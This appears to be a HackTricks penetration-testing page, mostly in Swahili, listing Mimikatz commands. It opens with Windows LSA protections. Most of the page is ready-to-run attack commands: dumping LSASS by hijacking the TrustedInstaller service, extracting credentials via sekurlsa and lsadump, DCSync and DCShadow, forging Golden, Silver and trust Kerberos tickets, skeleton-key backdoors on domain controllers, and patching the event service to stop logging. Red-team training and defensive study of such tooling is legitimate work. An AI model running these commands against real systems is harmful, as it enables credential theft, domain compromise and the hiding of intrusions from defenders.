# Mimikatz

{{#include ../../banners/hacktricks-training.md}}

**Ukurasa huu unategemea mmoja kutoka [adsecurity.org](https://adsecurity.org/?page_id=1821)**. Angalia asili kwa maelezo zaidi!

## LM na Maneno ya Kawaida katika kumbukumbu

Kuanzia Windows 8.1 na Windows Server 2012 R2 kuendelea, hatua kubwa zimechukuliwa kulinda dhidi ya wizi wa akidi:

- **LM hashes na maneno ya kawaida** hayahifadhiwi tena katika kumbukumbu ili kuboresha usalama. Mipangilio maalum ya rejista, _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_ inapaswa kuwekewa thamani ya DWORD ya `0` ili kuzima Uthibitishaji wa Digest, kuhakikisha maneno ya "kawaida" hayahifadhiwi katika LSASS.

- **Ulinzi wa LSA** umeanzishwa kulinda Mamlaka ya Usalama wa Mitaa (LSA) kutoka kwa usomaji wa kumbukumbu usioidhinishwa na sindikizo la msimbo. Hii inafikiwa kwa kuashiria LSASS kama mchakato uliohifadhiwa. Kuanzisha Ulinzi wa LSA kunahusisha:
1. Kubadilisha rejista katika _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ kwa kuweka `RunAsPPL` kuwa `dword:00000001`.
2. Kutekeleza Kituo cha Sera ya Kundi (GPO) kinacholazimisha mabadiliko haya ya rejista katika vifaa vinavyosimamiwa.

Licha ya ulinzi huu, zana kama Mimikatz zinaweza kupita Ulinzi wa LSA kwa kutumia madereva maalum, ingawa vitendo kama hivyo vinaweza kurekodiwa katika kumbukumbu za matukio.

### Kupambana na Kuondolewa kwa SeDebugPrivilege

Wasimamizi kwa kawaida wana SeDebugPrivilege, inayo wawezesha kufuatilia programu. Haki hii inaweza kupunguzwa ili kuzuia matukio yasiyoidhinishwa ya kumbukumbu, mbinu ya kawaida inayotumiwa na washambuliaji kutoa akidi kutoka kwa kumbukumbu. Hata hivyo, hata haki hii ikiondolewa, akaunti ya TrustedInstaller bado inaweza kufanya matukio ya kumbukumbu kwa kutumia usanidi maalum wa huduma:
```bash
sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
sc start TrustedInstaller
```
Hii inaruhusu kutolewa kwa kumbukumbu ya `lsass.exe` kwenye faili, ambayo inaweza kuchambuliwa kwenye mfumo mwingine ili kutoa akidi:
```
# privilege::debug
# sekurlsa::minidump lsass.dmp
# sekurlsa::logonpasswords
```
## Mimikatz Options

Event log tampering in Mimikatz involves two primary actions: clearing event logs and patching the Event service to prevent logging of new events. Below are the commands for performing these actions:

#### Clearing Event Logs

- **Command**: This action is aimed at deleting the event logs, making it harder to track malicious activities.
- Mimikatz does not provide a direct command in its standard documentation for clearing event logs directly via its command line. However, event log manipulation typically involves using system tools or scripts outside of Mimikatz to clear specific logs (e.g., using PowerShell or Windows Event Viewer).

#### Experimental Feature: Patching the Event Service

- **Command**: `event::drop`
- This experimental command is designed to modify the Event Logging Service's behavior, effectively preventing it from recording new events.
- Example: `mimikatz "privilege::debug" "event::drop" exit`

- The `privilege::debug` command ensures that Mimikatz operates with the necessary privileges to modify system services.
- The `event::drop` command then patches the Event Logging service.

### Kerberos Ticket Attacks

### Golden Ticket Creation

A Golden Ticket allows for domain-wide access impersonation. Key command and parameters:

- Command: `kerberos::golden`
- Parameters:
- `/domain`: Jina la domain.
- `/sid`: Kitambulisho cha Usalama (SID) cha domain.
- `/user`: Jina la mtumiaji wa kuiga.
- `/krbtgt`: Hash ya NTLM ya akaunti ya huduma ya KDC ya domain.
- `/ptt`: Inachoma tiketi moja kwa moja kwenye kumbukumbu.
- `/ticket`: Hifadhi tiketi kwa matumizi ya baadaye.

Example:
```bash
mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
```
### Uundaji wa Tiketi ya Silver

Tiketi za Silver zinatoa ufikiaji kwa huduma maalum. Amri kuu na vigezo:

- Amri: Inafanana na Tiketi ya Dhahabu lakini inalenga huduma maalum.
- Vigezo:
- `/service`: Huduma ya kulenga (mfano, cifs, http).
- Vigezo vingine vinafanana na Tiketi ya Dhahabu.

Mfano:
```bash
mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
```
### Uundaji wa Tiketi za Kuamini

Tiketi za Kuamini zinatumika kwa kupata rasilimali kati ya maeneo kwa kutumia uhusiano wa kuamini. Amri kuu na vigezo:

- Amri: Inafanana na Tiketi ya Dhahabu lakini kwa uhusiano wa kuamini.
- Vigezo:
- `/target`: FQDN ya eneo lengwa.
- `/rc4`: Hash ya NTLM kwa akaunti ya kuamini.

Mfano:
```bash
mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
```
### Amri za Nyongeza za Kerberos

- **Orodha ya Tiketi**:

- Amri: `kerberos::list`
- Orodha ya tiketi zote za Kerberos kwa kikao cha mtumiaji wa sasa.

- **Pita kwenye Kache**:

- Amri: `kerberos::ptc`
- Inachanganya tiketi za Kerberos kutoka kwa faili za kache.
- Mfano: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`

- **Pita Tiketi**:

- Amri: `kerberos::ptt`
- Inaruhusu kutumia tiketi ya Kerberos katika kikao kingine.
- Mfano: `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`

- **Futa Tiketi**:
- Amri: `kerberos::purge`
- Inafuta tiketi zote za Kerberos kutoka kwenye kikao.
- Inafaida kabla ya kutumia amri za kubadilisha tiketi ili kuepuka migongano.

### Uingiliaji wa Active Directory

- **DCShadow**: Kufanya mashine kuwa DC kwa muda kwa ajili ya urekebishaji wa vitu vya AD.

- `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`

- **DCSync**: Kuiga DC ili kuomba data za nywila.
- `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`

### Upatikanaji wa Akikazi

- **LSADUMP::LSA**: Kutolewa kwa akiba kutoka LSA.

- `mimikatz "lsadump::lsa /inject" exit`

- **LSADUMP::NetSync**: Kuiga DC kwa kutumia data za nywila za akaunti ya kompyuta.

- _Hakuna amri maalum iliyotolewa kwa NetSync katika muktadha wa asili._

- **LSADUMP::SAM**: Upatikanaji wa hifadhidata ya SAM ya ndani.

- `mimikatz "lsadump::sam" exit`

- **LSADUMP::Secrets**: Kufungua siri zilizohifadhiwa kwenye rejista.

- `mimikatz "lsadump::secrets" exit`

- **LSADUMP::SetNTLM**: Kuweka hash mpya ya NTLM kwa mtumiaji.

- `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`

- **LSADUMP::Trust**: Kupata taarifa za uthibitisho wa uaminifu.
- `mimikatz "lsadump::trust" exit`

### Mambo Mbalimbali

- **MISC::Skeleton**: Kuingiza backdoor kwenye LSASS kwenye DC.
- `mimikatz "privilege::debug" "misc::skeleton" exit`

### Kuinua Haki

- **PRIVILEGE::Backup**: Kupata haki za nakala.

- `mimikatz "privilege::backup" exit`

- **PRIVILEGE::Debug**: Kupata haki za debug.
- `mimikatz "privilege::debug" exit`

### Kutolewa kwa Akikazi

- **SEKURLSA::LogonPasswords**: Kuonyesha akiba za watumiaji walioingia.

- `mimikatz "sekurlsa::logonpasswords" exit`

- **SEKURLSA::Tickets**: Kutolewa kwa tiketi za Kerberos kutoka kwenye kumbukumbu.
- `mimikatz "sekurlsa::tickets /export" exit`

### Urekebishaji wa Sid na Token

- **SID::add/modify**: Kubadilisha SID na SIDHistory.

- Ongeza: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
- Badilisha: _Hakuna amri maalum ya kubadilisha katika muktadha wa asili._

- **TOKEN::Elevate**: Kuiga tokeni.
- `mimikatz "token::elevate /domainadmin" exit`

### Huduma za Terminal

- **TS::MultiRDP**: Kuruhusu vikao vingi vya RDP.

- `mimikatz "ts::multirdp" exit`

- **TS::Sessions**: Orodha ya vikao vya TS/RDP.
- _Hakuna amri maalum iliyotolewa kwa TS::Sessions katika muktadha wa asili._

### Vault

- Kutolewa kwa nywila kutoka Windows Vault.
- `mimikatz "vault::cred /patch" exit`


{{#include ../../banners/hacktricks-training.md}}
